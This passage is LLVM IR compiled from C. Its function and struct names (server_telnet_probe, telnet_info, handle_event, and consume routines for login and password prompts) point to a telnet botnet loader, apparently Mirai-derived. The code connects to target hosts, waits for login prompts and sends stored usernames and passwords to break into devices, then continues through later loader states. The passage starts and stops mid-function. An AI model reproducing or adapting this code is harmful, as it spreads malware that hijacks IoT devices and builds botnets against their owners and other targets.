  %153 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %148, i8* %152)
  br label %154

154:                                              ; preds = %142, %134, %128, %122
  br label %155

155:                                              ; preds = %154, %121
  br label %156

156:                                              ; preds = %155
  %157 = load i32, i32* %4, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %4, align 4
  br label %12, !llvm.loop !10

159:                                              ; preds = %12
  %160 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %9
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_destroy(%struct.server* %0) #0 {
  %2 = alloca %struct.server*, align 8
  store %struct.server* %0, %struct.server** %2, align 8
  %3 = load %struct.server*, %struct.server** %2, align 8
  %4 = icmp eq %struct.server* %3, null
  br i1 %4, label %5, label %6

5:                                                ; preds = %1
  br label %29

6:                                                ; preds = %1
  %7 = load %struct.server*, %struct.server** %2, align 8
  %8 = getelementptr inbounds %struct.server, %struct.server* %7, i32 0, i32 13
  %9 = load i32*, i32** %8, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %16

11:                                               ; preds = %6
  %12 = load %struct.server*, %struct.server** %2, align 8
  %13 = getelementptr inbounds %struct.server, %struct.server* %12, i32 0, i32 13
  %14 = load i32*, i32** %13, align 8
  %15 = bitcast i32* %14 to i8*
  call void @free(i8* %15) #8
  br label %16

16:                                               ; preds = %11, %6
  %17 = load %struct.server*, %struct.server** %2, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 11
  %19 = load %struct.server_worker*, %struct.server_worker** %18, align 8
  %20 = icmp ne %struct.server_worker* %19, null
  br i1 %20, label %21, label %26

21:                                               ; preds = %16
  %22 = load %struct.server*, %struct.server** %2, align 8
  %23 = getelementptr inbounds %struct.server, %struct.server* %22, i32 0, i32 11
  %24 = load %struct.server_worker*, %struct.server_worker** %23, align 8
  %25 = bitcast %struct.server_worker* %24 to i8*
  call void @free(i8* %25) #8
  br label %26

26:                                               ; preds = %21, %16
  %27 = load %struct.server*, %struct.server** %2, align 8
  %28 = bitcast %struct.server* %27 to i8*
  call void @free(i8* %28) #8
  br label %29

29:                                               ; preds = %26, %5
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_queue_telnet(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  br label %5

5:                                                ; preds = %13, %2
  %6 = load %struct.server*, %struct.server** %3, align 8
  %7 = getelementptr inbounds %struct.server, %struct.server* %6, i32 0, i32 1
  %8 = atomicrmw add i32* %7, i32 0 seq_cst, align 4
  %9 = load %struct.server*, %struct.server** %3, align 8
  %10 = getelementptr inbounds %struct.server, %struct.server* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = icmp uge i32 %8, %11
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %5, !llvm.loop !11

15:                                               ; preds = %5
  %16 = load %struct.server*, %struct.server** %3, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 1
  %18 = atomicrmw add i32* %17, i32 1 seq_cst, align 4
  %19 = load %struct.server*, %struct.server** %3, align 8
  %20 = icmp eq %struct.server* %19, null
  br i1 %20, label %21, label %22

21:                                               ; preds = %15
  br label %22

22:                                               ; preds = %21, %15
  %23 = load %struct.server*, %struct.server** %3, align 8
  %24 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  call void @server_telnet_probe(%struct.server* %23, %struct.telnet_info* %24)
  ret void
}

declare i32 @sleep(...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_telnet_probe(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.connection*, align 8
  %8 = alloca %struct.epoll_event, align 1
  %9 = alloca i32, align 4
  %10 = alloca %struct.server_worker*, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  %12 = load %struct.server*, %struct.server** %3, align 8
  %13 = call i32 @util_socket_and_bind(%struct.server* %12)
  store i32 %13, i32* %5, align 4
  store i32 0, i32* %9, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 11
  %16 = load %struct.server_worker*, %struct.server_worker** %15, align 8
  %17 = load %struct.server*, %struct.server** %3, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 18
  %19 = atomicrmw add i32* %18, i32 1 seq_cst, align 4
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 16
  %22 = load i8, i8* %21, align 2
  %23 = zext i8 %22 to i32
  %24 = srem i32 %19, %23
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %16, i64 %25
  store %struct.server_worker* %26, %struct.server_worker** %10, align 8
  %27 = load i32, i32* %5, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %38

29:                                               ; preds = %2
  %30 = call i64 @time(i64* null) #8
  %31 = srem i64 %30, 10
  %32 = icmp eq i64 %31, 0
  br i1 %32, label %33, label %34

33:                                               ; preds = %29
  br label %34

34:                                               ; preds = %33, %29
  %35 = load %struct.server*, %struct.server** %3, align 8
  %36 = getelementptr inbounds %struct.server, %struct.server* %35, i32 0, i32 1
  %37 = atomicrmw sub i32* %36, i32 1 seq_cst, align 4
  br label %111

38:                                               ; preds = %2
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = load %struct.server*, %struct.server** %3, align 8
  %42 = getelementptr inbounds %struct.server, %struct.server* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 8
  %44 = mul i32 %43, 2
  %45 = icmp uge i32 %40, %44
  br i1 %45, label %46, label %51

46:                                               ; preds = %39
  %47 = load i32, i32* %5, align 4
  %48 = load %struct.connection*, %struct.connection** %7, align 8
  %49 = getelementptr inbounds %struct.connection, %struct.connection* %48, i32 0, i32 4
  store i32 %47, i32* %49, align 8
  %50 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_close(%struct.connection* %50)
  br label %111

51:                                               ; preds = %39
  %52 = load %struct.server*, %struct.server** %3, align 8
  %53 = icmp eq %struct.server* %52, null
  br i1 %53, label %54, label %55

54:                                               ; preds = %51
  br label %55

55:                                               ; preds = %54, %51
  %56 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %57 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %56, i32 0, i32 2
  %58 = getelementptr inbounds [6 x i8], [6 x i8]* %57, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %58, i8 0, i64 6, i1 false)
  %59 = load %struct.server*, %struct.server** %3, align 8
  %60 = getelementptr inbounds %struct.server, %struct.server* %59, i32 0, i32 12
  %61 = load %struct.connection**, %struct.connection*** %60, align 8
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.connection*, %struct.connection** %61, i64 %63
  %65 = load %struct.connection*, %struct.connection** %64, align 8
  store %struct.connection* %65, %struct.connection** %7, align 8
  %66 = load %struct.connection*, %struct.connection** %7, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 3
  %68 = bitcast %struct.telnet_info* %67 to i8*
  %69 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %70 = bitcast %struct.telnet_info* %69 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %68, i8* align 4 %70, i64 120, i1 false)
  %71 = load %struct.server*, %struct.server** %3, align 8
  %72 = load %struct.connection*, %struct.connection** %7, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 1
  store %struct.server* %71, %struct.server** %73, align 8
  %74 = load i32, i32* %5, align 4
  %75 = load %struct.connection*, %struct.connection** %7, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 4
  store i32 %74, i32* %76, align 8
  %77 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_open(%struct.connection* %77)
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %78, align 4
  %79 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %80 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %79, i32 0, i32 4
  %81 = load i32, i32* %80, align 4
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  store i32 %81, i32* %83, align 4
  %84 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %85 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %84, i32 0, i32 5
  %86 = load i16, i16* %85, align 4
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %86, i16* %87, align 2
  %88 = load i32, i32* %5, align 4
  %89 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %90 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %90, %struct.sockaddr** %89, align 8
  %91 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %92 = load %struct.sockaddr*, %struct.sockaddr** %91, align 8
  %93 = call i32 @connect(i32 %88, %struct.sockaddr* %92, i32 16)
  store i32 %93, i32* %9, align 4
  %94 = load i32, i32* %9, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %101

96:                                               ; preds = %55
  %97 = call i32* @__errno_location() #11
  %98 = load i32, i32* %97, align 4
  %99 = icmp ne i32 %98, 115
  br i1 %99, label %100, label %101

100:                                              ; preds = %96
  br label %101

101:                                              ; preds = %100, %96, %55
  %102 = load i32, i32* %5, align 4
  %103 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %104 = bitcast %union.epoll_data* %103 to i32*
  store i32 %102, i32* %104, align 1
  %105 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 4, i32* %105, align 1
  %106 = load %struct.server_worker*, %struct.server_worker** %10, align 8
  %107 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %106, i32 0, i32 1
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %5, align 4
  %110 = call i32 @epoll_ctl(i32 %108, i32 1, i32 %109, %struct.epoll_event* %8) #8
  br label %111

111:                                              ; preds = %101, %46, %34
  ret void
}

declare i32 @util_socket_and_bind(%struct.server*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare void @connection_close(%struct.connection*) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #5

declare void @connection_open(%struct.connection*) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @bind_core(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca %struct.cpu_set_t, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %7 = call i64 @pthread_self() #11
  store i64 %7, i64* %3, align 8
  br label %8

8:                                                ; preds = %1
  %9 = bitcast %struct.cpu_set_t* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %9, i8 0, i64 128, i1 false)
  br label %10

10:                                               ; preds = %8
  %11 = load i32, i32* %2, align 4
  %12 = sext i32 %11 to i64
  store i64 %12, i64* %5, align 8
  %13 = load i64, i64* %5, align 8
  %14 = udiv i64 %13, 8
  %15 = icmp ult i64 %14, 128
  br i1 %15, label %16, label %27

16:                                               ; preds = %10
  %17 = load i64, i64* %5, align 8
  %18 = urem i64 %17, 64
  %19 = shl i64 1, %18
  %20 = getelementptr inbounds %struct.cpu_set_t, %struct.cpu_set_t* %4, i32 0, i32 0
  %21 = getelementptr inbounds [16 x i64], [16 x i64]* %20, i64 0, i64 0
  %22 = load i64, i64* %5, align 8
  %23 = udiv i64 %22, 64
  %24 = getelementptr inbounds i64, i64* %21, i64 %23
  %25 = load i64, i64* %24, align 8
  %26 = or i64 %25, %19
  store i64 %26, i64* %24, align 8
  br label %28

27:                                               ; preds = %10
  br label %28

28:                                               ; preds = %27, %16
  %29 = phi i64 [ %26, %16 ], [ 0, %27 ]
  store i64 %29, i64* %6, align 8
  %30 = load i64, i64* %6, align 8
  %31 = load i64, i64* %3, align 8
  %32 = call i32 @pthread_setaffinity_np(i64 %31, i64 128, %struct.cpu_set_t* %4) #8
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %28
  br label %35

35:                                               ; preds = %34, %28
  ret void
}

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #3

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @handle_event(%struct.server_worker* %0, %struct.epoll_event* %1) #0 {
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.connection*, align 8
  %7 = alloca %struct.epoll_event, align 1
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.binary*, align 8
  %13 = alloca i32, align 4
  store %struct.server_worker* %0, %struct.server_worker** %3, align 8
  store %struct.epoll_event* %1, %struct.epoll_event** %4, align 8
  store i32 0, i32* %5, align 4
  %14 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %15 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %14, i32 0, i32 0
  %16 = load %struct.server*, %struct.server** %15, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 12
  %18 = load %struct.connection**, %struct.connection*** %17, align 8
  %19 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %20 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %19, i32 0, i32 1
  %21 = bitcast %union.epoll_data* %20 to i32*
  %22 = load i32, i32* %21, align 1
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.connection*, %struct.connection** %18, i64 %23
  %25 = load %struct.connection*, %struct.connection** %24, align 8
  store %struct.connection* %25, %struct.connection** %6, align 8
  %26 = load %struct.connection*, %struct.connection** %6, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 4
  %28 = load i32, i32* %27, align 8
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %30, label %38

30:                                               ; preds = %2
  %31 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i32 0, i32 1
  %33 = bitcast %union.epoll_data* %32 to i32*
  %34 = load i32, i32* %33, align 1
  %35 = load %struct.connection*, %struct.connection** %6, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 4
  store i32 %34, i32* %36, align 8
  %37 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %37)
  br label %833

38:                                               ; preds = %2
  %39 = load %struct.connection*, %struct.connection** %6, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i32 0, i32 1
  %44 = bitcast %union.epoll_data* %43 to i32*
  %45 = load i32, i32* %44, align 1
  %46 = icmp ne i32 %41, %45
  br i1 %46, label %47, label %68

47:                                               ; preds = %38
  %48 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = and i32 %50, 8
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %65, label %53

53:                                               ; preds = %47
  %54 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 1
  %57 = and i32 %56, 16
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %65, label %59

59:                                               ; preds = %53
  %60 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 1
  %63 = and i32 %62, 8192
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %67

65:                                               ; preds = %59, %53, %47
  %66 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %66)
  br label %833

67:                                               ; preds = %59
  br label %68

68:                                               ; preds = %67, %38
  %69 = load %struct.connection*, %struct.connection** %6, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 10
  %71 = load i32, i32* %70, align 8
  %72 = icmp eq i32 %71, 1
  br i1 %72, label %73, label %107

73:                                               ; preds = %68
  %74 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 1
  %77 = and i32 %76, 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %107

79:                                               ; preds = %73
  store i32 0, i32* %8, align 4
  store i32 4, i32* %9, align 4
  %80 = load %struct.connection*, %struct.connection** %6, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 4
  %82 = load i32, i32* %81, align 8
  %83 = bitcast i32* %8 to i8*
  %84 = call i32 @getsockopt(i32 %82, i32 1, i32 4, i8* %83, i32* %9) #8
  %85 = load i32, i32* %8, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %79
  %88 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %88)
  br label %833

89:                                               ; preds = %79
  %90 = load %struct.connection*, %struct.connection** %6, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i32 0, i32 1
  %94 = bitcast %union.epoll_data* %93 to i32*
  store i32 %92, i32* %94, align 1
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i32 0, i32 0
  store i32 -2147483647, i32* %95, align 1
  %96 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %97 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %96, i32 0, i32 1
  %98 = load i32, i32* %97, align 8
  %99 = load %struct.connection*, %struct.connection** %6, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @epoll_ctl(i32 %98, i32 3, i32 %101, %struct.epoll_event* %7) #8
  %103 = load %struct.connection*, %struct.connection** %6, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 10
  store i32 2, i32* %104, align 8
  %105 = load %struct.connection*, %struct.connection** %6, align 8
  %106 = getelementptr inbounds %struct.connection, %struct.connection* %105, i32 0, i32 13
  store i16 45, i16* %106, align 2
  br label %107

107:                                              ; preds = %89, %73, %68
  %108 = load %struct.connection*, %struct.connection** %6, align 8
  %109 = getelementptr inbounds %struct.connection, %struct.connection* %108, i32 0, i32 14
  %110 = load i8, i8* %109, align 4
  %111 = icmp ne i8 %110, 0
  br i1 %111, label %113, label %112

112:                                              ; preds = %107
  br label %113

113:                                              ; preds = %112, %107
  %114 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %115 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 1
  %117 = and i32 %116, 1
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %833

119:                                              ; preds = %113
  %120 = load %struct.connection*, %struct.connection** %6, align 8
  %121 = getelementptr inbounds %struct.connection, %struct.connection* %120, i32 0, i32 14
  %122 = load i8, i8* %121, align 4
  %123 = sext i8 %122 to i32
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %833

125:                                              ; preds = %119
  store i32 0, i32* %10, align 4
  %126 = call i64 @time(i64* null) #8
  %127 = load %struct.connection*, %struct.connection** %6, align 8
  %128 = getelementptr inbounds %struct.connection, %struct.connection* %127, i32 0, i32 9
  store i64 %126, i64* %128, align 8
  br label %129

129:                                              ; preds = %125, %831
  %130 = load %struct.connection*, %struct.connection** %6, align 8
  %131 = getelementptr inbounds %struct.connection, %struct.connection* %130, i32 0, i32 4
  %132 = load i32, i32* %131, align 8
  %133 = load %struct.connection*, %struct.connection** %6, align 8
  %134 = getelementptr inbounds %struct.connection, %struct.connection* %133, i32 0, i32 18
  %135 = getelementptr inbounds [8192 x i8], [8192 x i8]* %134, i64 0, i64 0
  %136 = load %struct.connection*, %struct.connection** %6, align 8
  %137 = getelementptr inbounds %struct.connection, %struct.connection* %136, i32 0, i32 12
  %138 = load i16, i16* %137, align 8
  %139 = zext i16 %138 to i32
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i8, i8* %135, i64 %140
  %142 = load %struct.connection*, %struct.connection** %6, align 8
  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 12
  %144 = load i16, i16* %143, align 8
  %145 = zext i16 %144 to i64
  %146 = sub i64 8192, %145
  %147 = call i64 @recv(i32 %132, i8* %141, i64 %146, i32 16384)
  %148 = trunc i64 %147 to i32
  store i32 %148, i32* %10, align 4
  %149 = load i32, i32* %10, align 4
  %150 = icmp sle i32 %149, 0
  br i1 %150, label %151, label %162

151:                                              ; preds = %129
  %152 = call i32* @__errno_location() #11
  %153 = load i32, i32* %152, align 4
  %154 = icmp ne i32 %153, 11
  br i1 %154, label %155, label %161

155:                                              ; preds = %151
  %156 = call i32* @__errno_location() #11
  %157 = load i32, i32* %156, align 4
  %158 = icmp ne i32 %157, 11
  br i1 %158, label %159, label %161

159:                                              ; preds = %155
  %160 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %160)
  br label %161

161:                                              ; preds = %159, %155, %151
  br label %832

162:                                              ; preds = %129
  %163 = load i32, i32* %10, align 4
  %164 = load %struct.connection*, %struct.connection** %6, align 8
  %165 = getelementptr inbounds %struct.connection, %struct.connection* %164, i32 0, i32 12
  %166 = load i16, i16* %165, align 8
  %167 = zext i16 %166 to i32
  %168 = add nsw i32 %167, %163
  %169 = trunc i32 %168 to i16
  store i16 %169, i16* %165, align 8
  %170 = call i64 @time(i64* null) #8
  %171 = load %struct.connection*, %struct.connection** %6, align 8
  %172 = getelementptr inbounds %struct.connection, %struct.connection* %171, i32 0, i32 9
  store i64 %170, i64* %172, align 8
  %173 = load %struct.connection*, %struct.connection** %6, align 8
  %174 = getelementptr inbounds %struct.connection, %struct.connection* %173, i32 0, i32 12
  %175 = load i16, i16* %174, align 8
  %176 = zext i16 %175 to i32
  %177 = icmp sgt i32 %176, 8196
  br i1 %177, label %178, label %179

178:                                              ; preds = %162
  call void @abort() #9
  unreachable

179:                                              ; preds = %162
  br label %180

180:                                              ; preds = %179, %830
  store i32 0, i32* %11, align 4
  %181 = load %struct.connection*, %struct.connection** %6, align 8
  %182 = getelementptr inbounds %struct.connection, %struct.connection* %181, i32 0, i32 10
  %183 = load i32, i32* %182, align 8
  switch i32 %183, label %778 [
    i32 2, label %184
    i32 3, label %193
    i32 4, label %221
    i32 5, label %249
    i32 9, label %282
    i32 10, label %315
    i32 11, label %350
    i32 12, label %398
    i32 13, label %429
    i32 14, label %492
    i32 15, label %534
    i32 16, label %592
    i32 17, label %646
    i32 18, label %768
  ]

184:                                              ; preds = %180
  %185 = load %struct.connection*, %struct.connection** %6, align 8
  %186 = call i32 @connection_consume_iacs(%struct.connection* %185)
  store i32 %186, i32* %11, align 4
  %187 = load i32, i32* %11, align 4
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %189, label %192

189:                                              ; preds = %184
  %190 = load %struct.connection*, %struct.connection** %6, align 8
  %191 = getelementptr inbounds %struct.connection, %struct.connection* %190, i32 0, i32 10
  store i32 3, i32* %191, align 8
  br label %192

192:                                              ; preds = %189, %184
  br label %779

193:                                              ; preds = %180
  %194 = load %struct.connection*, %struct.connection** %6, align 8
  %195 = call i32 @connection_consume_login_prompt(%struct.connection* %194)
  store i32 %195, i32* %11, align 4
  %196 = load i32, i32* %11, align 4
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %198, label %220

198:                                              ; preds = %193
  %199 = load %struct.connection*, %struct.connection** %6, align 8
  %200 = getelementptr inbounds %struct.connection, %struct.connection* %199, i32 0, i32 4
  %201 = load i32, i32* %200, align 8
  %202 = load %struct.connection*, %struct.connection** %6, align 8
  %203 = getelementptr inbounds %struct.connection, %struct.connection* %202, i32 0, i32 3
  %204 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %203, i32 0, i32 0
  %205 = getelementptr inbounds [32 x i8], [32 x i8]* %204, i64 0, i64 0
  %206 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %201, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %205)
  %207 = load %struct.connection*, %struct.connection** %6, align 8
  %208 = getelementptr inbounds %struct.connection, %struct.connection* %207, i32 0, i32 11
  %209 = getelementptr inbounds %struct.anon, %struct.anon* %208, i32 0, i32 0
  %210 = getelementptr inbounds [512 x i8], [512 x i8]* %209, i64 0, i64 0
  %211 = call i8* @strcpy(i8* %210, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0)) #8
  %212 = call i64 @time(i64* null) #8
  %213 = add nsw i64 %212, 1
  %214 = trunc i64 %213 to i32
  %215 = load %struct.connection*, %struct.connection** %6, align 8
  %216 = getelementptr inbounds %struct.connection, %struct.connection* %215, i32 0, i32 11
  %217 = getelementptr inbounds %struct.anon, %struct.anon* %216, i32 0, i32 1
  store i32 %214, i32* %217, align 4
  %218 = load %struct.connection*, %struct.connection** %6, align 8
  %219 = getelementptr inbounds %struct.connection, %struct.connection* %218, i32 0, i32 10
  store i32 4, i32* %219, align 8
  br label %220

220:                                              ; preds = %198, %193
  br label %779

221:                                              ; preds = %180
  %222 = load %struct.connection*, %struct.connection** %6, align 8
  %223 = call i32 @connection_consume_password_prompt(%struct.connection* %222)
  store i32 %223, i32* %11, align 4
  %224 = load i32, i32* %11, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %248

226:                                              ; preds = %221
  %227 = load %struct.connection*, %struct.connection** %6, align 8
  %228 = getelementptr inbounds %struct.connection, %struct.connection* %227, i32 0, i32 4
  %229 = load i32, i32* %228, align 8
  %230 = load %struct.connection*, %struct.connection** %6, align 8
  %231 = getelementptr inbounds %struct.connection, %struct.connection* %230, i32 0, i32 3
  %232 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %231, i32 0, i32 1
  %233 = getelementptr inbounds [32 x i8], [32 x i8]* %232, i64 0, i64 0
  %234 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %229, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %233)
  %235 = load %struct.connection*, %struct.connection** %6, align 8
  %236 = getelementptr inbounds %struct.connection, %struct.connection* %235, i32 0, i32 11
  %237 = getelementptr inbounds %struct.anon, %struct.anon* %236, i32 0, i32 0
  %238 = getelementptr inbounds [512 x i8], [512 x i8]* %237, i64 0, i64 0
  %239 = call i8* @strcpy(i8* %238, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i64 0, i64 0)) #8
  %240 = call i64 @time(i64* null) #8
  %241 = add nsw i64 %240, 1
  %242 = trunc i64 %241 to i32
  %243 = load %struct.connection*, %struct.connection** %6, align 8
  %244 = getelementptr inbounds %struct.connection, %struct.connection* %243, i32 0, i32 11
  %245 = getelementptr inbounds %struct.anon, %struct.anon* %244, i32 0, i32 1
  store i32 %242, i32* %245, align 4
  %246 = load %struct.connection*, %struct.connection** %6, align 8
  %247 = getelementptr inbounds %struct.connection, %struct.connection* %246, i32 0, i32 10
  store i32 5, i32* %247, align 8
  br label %248

248:                                              ; preds = %226, %221
  br label %779

249:                                              ; preds = %180
  %250 = load %struct.connection*, %struct.connection** %6, align 8
  %251 = call i32 @connection_consume_prompt(%struct.connection* %250)
  store i32 %251, i32* %11, align 4
